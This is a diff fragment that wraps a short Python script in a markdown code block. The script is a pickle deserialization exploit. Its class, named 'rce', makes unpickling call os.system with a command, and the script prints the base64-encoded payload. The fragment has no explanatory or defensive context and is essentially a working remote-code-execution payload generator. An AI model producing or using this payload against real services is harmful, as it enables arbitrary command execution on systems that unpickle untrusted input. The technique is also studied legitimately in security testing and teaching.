@@ -1,3 +1,6 @@
+```
+python
+
 import pickle
 import sys
 import base64
@@ -10,3 +13,4 @@ class rce(object):
         return (os.system,(command,))
 
 print(base64.b64encode(pickle.dumps(rce())))
+```
